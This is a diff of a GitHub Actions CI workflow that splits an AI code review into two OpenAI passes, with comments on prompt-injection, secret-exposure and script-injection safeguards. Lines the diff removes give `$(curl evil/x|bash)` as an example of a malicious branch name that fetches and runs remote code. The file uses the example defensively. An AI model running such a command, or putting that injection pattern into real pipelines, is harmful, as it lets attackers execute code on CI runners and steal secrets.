@@ -4,9 +4,9 @@ on:
   push:
     branches: [main]
   pull_request:
-  # Lets ai-code-review force-run a specific skipped job when it disagrees
-  # with the path filter's decision for a given diff (see that job's own
-  # comment below for why this exists and how it's constrained). Also
+  # Lets ai-ci-results-review (pass 2 of the two-pass AI review — see that
+  # job's own comment below) force-run a specific skipped job when it
+  # disagrees with the path filter's decision for a given diff. Also
   # available for a human to trigger by hand from the Actions tab if ever
   # needed — `force_jobs` just defaults to empty, running nothing extra.
   workflow_dispatch:
@@ -279,8 +279,9 @@ jobs:
     needs: [changes]
     # Only scans the lockfile for known vulnerabilities — irrelevant to
     # source changes with no dependency bump. The workflow_dispatch clause
-    # lets ai-code-review (or a human) force this to run despite the skip
-    # — see that job's own comment for why/how this is constrained.
+    # lets ai-ci-results-review (pass 2 of the two-pass AI review, or a
+    # human) force this to run despite the skip — see that job's own
+    # comment for why/how this is constrained.
     if: needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'audit'))
     steps:
       - uses: actions/checkout@v7
@@ -926,143 +927,79 @@ jobs:
 
   # Second, independent agent in the two-step "one writes, one reviews"
   # setup: the jobs above are the implementer's work (whether that's a
-  # human, Claude Code interactively, or Dependabot); this is a separate,
-  # stateless ChatGPT (OpenAI) call that reviews the diff and either
-  # approves or requests changes as a real PR review — not just a comment.
+  # human, Claude Code interactively, or Dependabot); this and
+  # ai-ci-results-review below are a separate, stateless ChatGPT (OpenAI)
+  # review, split into two passes (see CLAUDE.md's "AI code review gate"
+  # section for the full history of why). Both passes review and either
+  # approve or request changes as a real PR review — not just a comment.
   # A real "Changes requested" review leaves `required_pull_request_reviews`
-  # unsatisfied, so this is a genuine merge gate, not advisory.
+  # unsatisfied, so both are genuine merge gates, not advisory.
   #
   # Deliberately a different vendor from the implementer, not just a
   # different session of the same model — ai-failure-analysis above and the
-  # implementer (Claude Code) are both Anthropic; this job is OpenAI. Actual
-  # cross-vendor independence, not just a fresh context window: no shared
-  # training data, no shared RLHF blind spots, no shared susceptibility to
-  # the same framing of an injected instruction.
+  # implementer (Claude Code) are both Anthropic; both review passes are
+  # OpenAI. Actual cross-vendor independence, not just a fresh context
+  # window: no shared training data, no shared RLHF blind spots, no shared
+  # susceptibility to the same framing of an injected instruction.
   #
-  # Deliberately only runs when nothing upstream has already failed — a
-  # failing required check already blocks merge on its own, so this job
-  # never has the chance to "approve past" a real failure; the one thing it
-  # can get wrong is judging the *code*, not contradicting a known-failed
-  # check. See scripts/ai-code-review.mjs for how hallucination/context-
-  # leaking risk is handled: no commit messages or PR description are
-  # passed in (only the raw diff + raw CI results), every claim has to cite
-  # actual diff/log content, and the "Post review verdict" step below fails
+  # Hallucination/context-leaking risk is handled the same way in both
+  # passes' scripts (ai-code-review.mjs, ai-ci-results-review.mjs): no
+  # commit messages or PR description are passed in (only the raw diff,
+  # plus raw CI results for pass 2), every claim has to cite actual
+  # diff/log content, and each job's own "Post review verdict" step fails
   # closed (REQUEST_CHANGES) on anything that isn't a clean, verifiable
-  # APPROVE — API errors, malformed output, or a "files reviewed" list that
-  # doesn't match the real diff all count as untrusted.
+  # APPROVE — API errors, malformed output, or a "files reviewed" list
+  # that doesn't match the real diff all count as untrusted.
   #
-  # Admin-bypass (`gh pr merge --admin`) still technically overrides this,
-  # same as it overrides the review requirement generally — don't use it to
-  # route around a REQUEST_CHANGES verdict without actually addressing what
-  # it flagged, for the same reason this repo doesn't admin-bypass a
-  # failing Lighthouse check.
+  # Admin-bypass (`gh pr merge --admin`) still technically overrides
+  # either pass, same as it overrides the review requirement generally —
+  # don't use it to route around a REQUEST_CHANGES verdict without
+  # actually addressing what it flagged, for the same reason this repo
+  # doesn't admin-bypass a failing Lighthouse check.
   #
-  # Accepted risk, deliberately not engineered around: this job runs on
-  # `pull_request`, which executes the workflow file *from the PR branch
-  # itself* (unlike `pull_request_target`), and uses secrets.OPENAI_API_KEY.
-  # A same-repo branch that edited this job could exfiltrate that key before
-  # the verdict step ever runs. Not new to this job — ai-failure-analysis
-  # above has carried the identical exposure (for secrets.ANTHROPIC_API_KEY)
-  # since it was added. Left as-is because: this repo has no external fork
-  # contributors (GitHub already withholds secrets from fork PRs on
-  # `pull_request` specifically, so that path isn't the risk); every branch
-  # that could exploit this already requires push access to this repo, at
-  # which point far more direct paths to the same secret already exist.
-  # Revisit (e.g. an Environment with required-reviewer protection on the
-  # secret) if this repo ever takes external contributions.
+  # Accepted risk, deliberately not engineered around, on both passes:
+  # each runs on `pull_request`, which executes the workflow file *from
+  # the PR branch itself* (unlike `pull_request_target`), and uses
+  # secrets.OPENAI_API_KEY. A same-repo branch that edited either job
+  # could exfiltrate that key before the verdict step ever runs. Not new
+  # to this repo — ai-failure-analysis above has carried the identical
+  # exposure (for secrets.ANTHROPIC_API_KEY) since it was added. Left as
+  # -is because: this repo has no external fork contributors (GitHub
+  # already withholds secrets from fork PRs on `pull_request`
+  # specifically, so that path isn't the risk); every branch that could
+  # exploit this already requires push access to this repo, at which
+  # point far more direct paths to the same secret already exist. Revisit
+  # (e.g. an Environment with required-reviewer protection on the secret)
+  # if this repo ever takes external contributions.
   #
-  # The reviewer also judges the path filter's skip decisions for this
-  # specific diff (see the "This repo path-filters CI" paragraph in
-  # ai-code-review.mjs's prompt) and can name skipped jobs it believes
-  # should actually run — a static glob-based filter can miss genuine
-  # cross-boundary effects the way docker-scan/docker-smoke's Dockerfile
-  # gotcha already shows is possible (see the `changes` job's comment).
-  # Structurally can't cause a skip that was CORRECT to become a problem —
-  # forcing an unnecessary job to run just costs some CI time, nothing
-  # more, so this doesn't need the same paranoid cross-checking as the
-  # approve/reject verdict. Real guardrails that do exist: the model may
-  # only ever name job IDs from a fixed whitelist (enforced twice — once
-  # in the prompt, once again by exact-match filtering in
-  # extractForceRunJobs, since a value only being *requested* isn't the
-  # same as it being *safe to trust*); the list is never interpolated
-  # into a shell command directly, only passed through `gh workflow run`'s
-  # own `-f` flag; and because GitHub Actions has no way to change a
-  # job's `if:` mid-run, "force-running" a job means starting a genuinely
-  # separate `workflow_dispatch` run — it cannot retroactively resurrect
-  # the job that was actually skipped in the current run.
+  # Pass 1 of a two-pass AI review (see CLAUDE.md's "AI code review gate"
+  # section). Deliberately diff-only, no CI grounding, no `needs:` at all
+  # -- starts the moment the PR event fires, genuinely in parallel with
+  # every other job, instead of waiting for the full CI suite to finish
+  # just to get code-quality feedback that never needed those results in
+  # the first place. Split out after PR #66 (the live-progress CI comment
+  # work, same session) round-tripped through four real review findings,
+  # each one waiting on the entire CI suite to re-run before the reviewer
+  # even looked again -- and every one of those four findings (a logic
+  # bug, missing test coverage, a missing permission, a stale doc
+  # paragraph) turned out to be catchable from the diff alone. Pass 2
+  # (ai-ci-results-review, below) picks up the CI-grounded half: did the
+  # skip-logic behave correctly, and do the results look sane.
   ai-code-review:
     name: AI code review
     runs-on: ubuntu-latest
-    # Checks both failure and cancelled, not just failure — a cancelled
-    # upstream job means its result is genuinely unknown (tests never
-    # finished, not "tests passed"), so it shouldn't be reviewed as if
-    # everything upstream actually completed.
-    if: |
-      always() &&
-      github.event_name == 'pull_request' &&
-      !contains(needs.*.result, 'failure') &&
-      !contains(needs.*.result, 'cancelled')
-    needs:
-      [
-        lint,
-        test-ci-scripts,
-        audit,
-        test-api-unit,
-        test-api-e2e,
-        test-web,
-        docker-scan,
-        docker-smoke,
-        perf-budget,
-        load-test,
-        test-e2e-web,
-      ]
+    if: github.event_name == 'pull_request'
     permissions:
       contents: read
       pull-requests: write
-      # Only for the "Force-run skipped CI jobs" step's `gh workflow run`
-      # call — a workflow_dispatch trigger requires actions: write.
-      actions: write
     steps:
       - uses: actions/checkout@v7
 
-      - name: Fetch PR diff and job results
+      - name: Fetch PR diff
         env:
           GH_TOKEN: ${{ github.token }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: |
-          gh pr diff "$PR_NUMBER" > /tmp/pr-diff.txt
-
-          cat > /tmp/job-summary.json << 'EOF'
-          {
-            "lint": "${{ needs.lint.result }}",
-            "test-ci-scripts": "${{ needs.test-ci-scripts.result }}",
-            "audit": "${{ needs.audit.result }}",
-            "test-api-unit": "${{ needs.test-api-unit.result }}",
-            "test-api-e2e": "${{ needs.test-api-e2e.result }}",
-            "test-web": "${{ needs.test-web.result }}",
-            "docker-scan": "${{ needs.docker-scan.result }}",
-            "docker-smoke": "${{ needs.docker-smoke.result }}",
-            "perf-budget": "${{ needs.perf-budget.result }}",
-            "load-test": "${{ needs.load-test.result }}",
-            "test-e2e-web": "${{ needs.test-e2e-web.result }}"
-          }
-          EOF
-
-      # Grepped summary lines, not full logs — enough for the reviewer to
-      # ground a "does test coverage look proportionate" judgment in real
-      # text, without a prompt-sized dump of install/build noise. Same raw
-      # per-job log endpoint as ai-failure-analysis (not `gh run view`,
-      # which gates on the whole run completing).
-      - name: Fetch test summary log excerpts
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          : > /tmp/test-summaries.txt
-          job_ids=$(gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/jobs" --paginate --jq '.jobs[] | select(.name == "API unit tests" or .name == "API e2e tests" or .name == "Web build + tests" or .name == "Web e2e (Playwright)") | .id')
-          for job_id in $job_ids; do
-            echo "=== Job $job_id ===" >> /tmp/test-summaries.txt
-            gh api --allow-escape-sequences "repos/${{ github.repository }}/actions/jobs/$job_id/logs" 2>/dev/null | grep -E "Test Files|Tests |Suites:|Tests:|passed|failed|coverage" >> /tmp/test-summaries.txt || true
-          done
+        run: gh pr diff "$PR_NUMBER" > /tmp/pr-diff.txt
 
       - uses: pnpm/action-setup@v6
       - uses: actions/setup-node@v7
@@ -1079,7 +1016,10 @@ jobs:
       # just the marker string — this is a public-thread trust boundary,
       # not a formatting convention, since anyone who can comment on a
       # public PR could otherwise post a fake "already discussed and
-      # dismissed" comment to try to suppress a real finding.
+      # dismissed" comment to try to suppress a real finding. Both this
+      # pass and ai-ci-results-review (pass 2) run this identical step, so
+      # a finding resolved with either one won't get re-raised by the
+      # other — they share the same log comment.
       - name: Fetch prior override decisions
         env:
           GH_TOKEN: ${{ github.token }}
@@ -1124,7 +1064,7 @@ jobs:
         continue-on-error: true
         env:
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-        run: node scripts/ai-code-review.mjs /tmp/pr-diff.txt /tmp/job-summary.json /tmp/test-summaries.txt /tmp/diff-truncated.txt /tmp/override-decisions.json > /tmp/review.md
+        run: node scripts/ai-code-review.mjs /tmp/pr-diff.txt /tmp/diff-truncated.txt /tmp/override-decisions.json > /tmp/review.md
 
       # Runs the same tests that back scripts/lib/review-verdict.mjs
       # (scripts/lib/review-verdict.test.mjs) as an actual CI gate, not
@@ -1217,41 +1157,201 @@ jobs:
             gh pr review "$PR_NUMBER" --request-changes --body-file /tmp/review-comment.md
           fi
 
-      # GitHub Actions has no way to change a job's `if:` mid-run, so
-      # "force-running" a skipped job means starting a genuinely separate
-      # workflow_dispatch run on this same branch — it can't resurrect the
-      # job that was actually skipped in the run this step is part of.
-      # Gated on steps.review.outcome specifically (not just always()):
-      # if the review itself never completed, there's no trustworthy
-      # review.md to read a force-run list from.
-      #
-      # Untestable pre-merge, structurally: GitHub only recognizes
-      # workflow_dispatch as a valid trigger for a workflow file once that
-      # trigger exists on the *default branch* — until this PR merges,
-      # `gh workflow run` below will fail (`set +e` catches it, logs it,
-      # doesn't fail this job) rather than actually dispatch anything, even
-      # on this PR's own branch. Verified everything else that can be
-      # verified pre-merge (unit tests on the parsing, YAML validity,
-      # dry-run of the command's own syntax) — the live dispatch call
-      # itself is the one piece that can only be confirmed working after
-      # this lands on main.
+  # Pass 2 of the two-pass AI review — see the comment above ai-code-review
+  # (pass 1) for the full split rationale. This pass is deliberately
+  # narrow: it does NOT re-review code correctness/security, only whether
+  # the CI skip-logic behaved correctly for this diff (absorbing the
+  # force-run mechanism that used to live in pass 1) and whether the CI
+  # results themselves look sane. Confirmed directly with the user: this
+  # is a real, blocking review (same REQUEST_CHANGES/degrade-to-comment
+  # mechanism as pass 1), not informational-only -- a genuine skip-logic
+  # gap is worth blocking on, same reasoning the force-run mechanism
+  # itself already relied on before this split.
+  #
+  # This is the only one of the two passes that judges the path filter's
+  # skip decisions and can name skipped jobs it believes should actually
+  # run — a static glob-based filter can miss genuine cross-boundary
+  # effects the way docker-scan/docker-smoke's Dockerfile gotcha already
+  # shows is possible (see the `changes` job's comment). Structurally
+  # can't cause a skip that was CORRECT to become a problem — forcing an
+  # unnecessary job to run just costs some CI time, nothing more, so this
+  # doesn't need the same paranoid cross-checking as the approve/reject
+  # verdict itself. Real guardrails that do exist: the model may only ever
+  # name job IDs from a fixed whitelist (enforced twice — once in the
+  # prompt, once again by exact-match filtering in extractForceRunJobs,
+  # since a value only being *requested* isn't the same as it being *safe
+  # to trust*); the list is never interpolated into a shell command
+  # directly, only passed through `gh workflow run`'s own `-f` flag; and
+  # because GitHub Actions has no way to change a job's `if:` mid-run,
+  # "force-running" a job means starting a genuinely separate
+  # `workflow_dispatch` run — it cannot retroactively resurrect the job
+  # that was actually skipped in the current run.
+  ai-ci-results-review:
+    name: AI CI-results review
+    runs-on: ubuntu-latest
+    # Deliberately `always()`, unconditional on needs.*.result -- NOT the
+    # "skip if anything upstream failed" gate pass 1 used to have. That
+    # gate existed because a failing required check already blocks merge
+    # on its own, so approving *code* past a real failure was structurally
+    # pointless. This pass checks something different -- whether the
+    # skip/run decisions and results themselves look right -- and a
+    # failure is arguably the case where that's most useful to check, not
+    # least (mirrors comment-ci-result-on-pr's own always() reasoning:
+    # the failure case is the valuable one to surface, not just the happy
+    # path).
+    if: |
+      always() &&
+      github.event_name == 'pull_request'
+    needs:
+      [
+        changes,
+        lint,
+        test-ci-scripts,
+        audit,
+        test-api-unit,
+        test-api-e2e,
+        test-web,
+        docker-scan,
+        docker-smoke,
+        perf-budget,
+        load-test,
+        test-e2e-web,
+      ]
+    permissions:
+      contents: read
+      pull-requests: write
+      # Only for the "Force-run skipped CI jobs" step's `gh workflow run`
+      # call — a workflow_dispatch trigger requires actions: write.
+      actions: write
+    steps:
+      - uses: actions/checkout@v7
+
+      - name: Fetch PR diff and job results
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          gh pr diff "$PR_NUMBER" > /tmp/pr-diff.txt
+
+          cat > /tmp/job-summary.json << 'EOF'
+          {
+            "path_filter": {
+              "api": "${{ needs.changes.outputs.api }}",
+              "web": "${{ needs.changes.outputs.web }}",
+              "deps": "${{ needs.changes.outputs.deps }}",
+              "docker": "${{ needs.changes.outputs.docker }}"
+            },
+            "lint": "${{ needs.lint.result }}",
+            "test-ci-scripts": "${{ needs.test-ci-scripts.result }}",
+            "audit": "${{ needs.audit.result }}",
+            "test-api-unit": "${{ needs.test-api-unit.result }}",
+            "test-api-e2e": "${{ needs.test-api-e2e.result }}",
+            "test-web": "${{ needs.test-web.result }}",
+            "docker-scan": "${{ needs.docker-scan.result }}",
+            "docker-smoke": "${{ needs.docker-smoke.result }}",
+            "perf-budget": "${{ needs.perf-budget.result }}",
+            "load-test": "${{ needs.load-test.result }}",
+            "test-e2e-web": "${{ needs.test-e2e-web.result }}"
+          }
+          EOF
+
+      # Grepped summary lines, not full logs — enough for the reviewer to
+      # ground a "does test coverage look proportionate" judgment in real
+      # text, without a prompt-sized dump of install/build noise. Same raw
+      # per-job log endpoint as ai-failure-analysis (not `gh run view`,
+      # which gates on the whole run completing).
+      - name: Fetch test summary log excerpts
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          : > /tmp/test-summaries.txt
+          job_ids=$(gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/jobs" --paginate --jq '.jobs[] | select(.name == "API unit tests" or .name == "API e2e tests" or .name == "Web build + tests" or .name == "Web e2e (Playwright)") | .id')
+          for job_id in $job_ids; do
+            echo "=== Job $job_id ===" >> /tmp/test-summaries.txt
+            gh api --allow-escape-sequences "repos/${{ github.repository }}/actions/jobs/$job_id/logs" 2>/dev/null | grep -E "Test Files|Tests |Suites:|Tests:|passed|failed|coverage" >> /tmp/test-summaries.txt || true
+          done
+
+      - uses: pnpm/action-setup@v6
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 22
+          cache: pnpm
+      - run: pnpm install --frozen-lockfile
+
+      # Same mechanism and same reasoning as pass 1's identically-named
+      # step above — both passes read the same log comment.
+      - name: Fetch prior override decisions
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set +e
+          gh api "repos/${{ github.repository }}/issues/$PR_NUMBER/comments" --paginate --slurp \
+            > /tmp/pr-comments-raw.json
+          if [ ! -s /tmp/pr-comments-raw.json ]; then
+            echo "gh api call for PR comments failed or returned nothing — defaulting to no override context." >&2
+            echo "[]" > /tmp/pr-comments-raw.json
+          fi
+          node scripts/parse-override-decisions.mjs /tmp/pr-comments-raw.json "${{ github.repository_owner }}" \
+            > /tmp/override-decisions.json
+
+      - name: Review with ChatGPT
+        id: review
+        continue-on-error: true
+        env:
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+        run: node scripts/ai-ci-results-review.mjs /tmp/pr-diff.txt /tmp/job-summary.json /tmp/test-summaries.txt /tmp/diff-truncated.txt /tmp/override-decisions.json > /tmp/review.md
+
+      - name: Test review-verdict parsing
+        run: node --test scripts/lib/review-verdict.test.mjs
+
+      - name: Test override-decision parsing
+        run: node --test scripts/lib/override-decisions.test.mjs
+
+      - name: Post review verdict
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set +e
+          verdict="REQUEST_CHANGES"
+
+          if [ "${{ steps.review.outcome }}" = "success" ] && [ -s /tmp/review.md ]; then
+            gh pr diff "$PR_NUMBER" --name-only > /tmp/actual-files.txt
+            verdict=$(node scripts/parse-review-verdict.mjs /tmp/review.md /tmp/actual-files.txt /tmp/diff-truncated.txt)
+          else
+            echo "Automated review did not complete — flagging for human review." > /tmp/review.md
+          fi
+
+          {
+            echo "### 🤖 AI CI-results review (ChatGPT · GPT-5.6)"
+            echo
+            cat /tmp/review.md
+            echo
+            echo "_Automated review — verify before trusting it, especially a REQUEST_CHANGES verdict on something it may have misread._"
+          } > /tmp/review-comment.md
+
+          # Same GitHub platform restriction, same reasoning, same
+          # deliberate non-fix as pass 1's identical step above — see that
+          # step's comment for the full history (PR #20, PR #36).
+          if [ "$verdict" = "APPROVE" ]; then
+            gh pr comment "$PR_NUMBER" --body-file /tmp/review-comment.md
+          else
+            gh pr review "$PR_NUMBER" --request-changes --body-file /tmp/review-comment.md
+          fi
+
+      # Moved here from pass 1, unchanged internals — see this step's
+      # original landing (this same comment block) for the full history:
+      # the HEAD_REF env-injection guard, the three-way dispatch-outcome
+      # handling, and why this is structurally untestable pre-merge
+      # (workflow_dispatch only becomes a valid trigger once it exists on
+      # the default branch).
       - name: Force-run skipped CI jobs if the reviewer disagrees
         if: always() && steps.review.outcome == 'success'
         env:
           GH_TOKEN: ${{ github.token }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
-          # Passed via env, not interpolated directly into the run: script
-          # below, deliberately -- github.event.pull_request.head.ref is a
-          # PR author-controlled branch name, and GitHub substitutes `${{
-          # }}` expressions as literal text BEFORE the shell parses the
-          # script. A branch named e.g. `$(curl evil/x|bash)` would, if
-          # interpolated directly, become real shell command substitution
-          # in the runner's context -- a live AI review round on this
-          # exact PR caught this (this repo's own official GitHub Actions
-          # script-injection example). Referencing it as "$HEAD_REF"
-          # instead means its contents go through ordinary parameter
-          # expansion, never re-parsed as shell syntax, regardless of what
-          # characters it contains.
           HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
           set +e
@@ -1260,44 +1360,12 @@ jobs:
           if [ -n "$force_jobs" ]; then
             echo "Reviewer disagrees with CI skip logic — force-running: $force_jobs"
 
-            # `gh workflow run` prints the created run's URL to stdout on
-            # success ("The created workflow run URL will be returned if
-            # available" per `gh workflow run --help") -- captured here so
-            # the PR comment can link directly to it instead of just
-            # pointing at the Actions tab and making the reader hunt for
-            # the right run. Verified this is really stdout, not stderr,
-            # by running it for real with the streams split.
             run_url=$(gh workflow run ci.yml --ref "$HEAD_REF" -f force_jobs="$force_jobs" 2>/tmp/force-run-error.txt)
             dispatch_exit=$?
 
-            # Three distinct outcomes, not two -- a live review round
-            # caught that collapsing "exit 0, empty URL" into the same
-            # branch as a genuine dispatch failure is itself wrong: `gh`'s
-            # own docs say the URL is returned "if available", meaning a
-            # real success with no URL is an expected, non-error case. The
-            # first version of this fix treated that case as a failure and
-            # told the reader to manually re-dispatch -- which, since the
-            # original dispatch actually succeeded, would create a real
-            # duplicate run instead of just being unhelpful.
             if [ $dispatch_exit -ne 0 ]; then
               dispatch_error=$(cat /tmp/force-run-error.txt)
               echo "gh workflow run failed (exit $dispatch_exit): $dispatch_error"
-              # Deliberately does NOT display a literal `gh workflow run
-              # --ref $HEAD_REF ...` command here, even though embedding it
-              # in this bash string is itself safe (no shell re-execution
-              # happens building a --body string). The risk is downstream:
-              # HEAD_REF is a PR-author-controlled branch name, and this
-              # would render it in the PR comment as a "copy this and run
-              # it" shell snippet -- if a maintainer copy-pastes it into
-              # their own terminal trusting the suggestion, THEIR shell
-              # would parse whatever the branch name contains, e.g. a
-              # crafted $(curl evil/x|bash). A live review round caught
-              # this as a distinct risk from the runner-side interpolation
-              # fixed above (env: HEAD_REF protects the runner; it does
-              # nothing for text a human later copies out of this comment
-              # and pastes into their own shell). Pointing at the Actions
-              # UI instead sidesteps it entirely -- the branch there comes
-              # from GitHub's own picker, never copy-pasted text.
               gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it automatically failed (a dispatch error, not a job failure -- see this job's own log for details). To trigger it by hand: open the Actions tab, select the CI workflow, click \"Run workflow\", pick this PR's branch from the dropdown, and set \`force_jobs\` to \`$force_jobs\`. Don't copy a branch name out of a PR comment into a shell command -- it isn't sanitized for that."
             elif [ -n "$run_url" ]; then
               gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. Triggered run: $run_url — runs independently of this PR's normal required checks, since GitHub Actions can't retroactively un-skip a job in the run already in progress."
@@ -1422,7 +1490,9 @@ jobs:
     # AI-review round, confirmed against two other jobs in this same file
     # that call the identical endpoint and already declare it correctly:
     # ai-failure-analysis (actions: read) and ai-code-review (actions:
-    # write, for its force-run capability).
+    # write, for its force-run capability, at the time this was written —
+    # that capability later moved to ai-ci-results-review when the review
+    # split into two passes; see that job's own permissions block).
     permissions:
       contents: read
       pull-requests: write
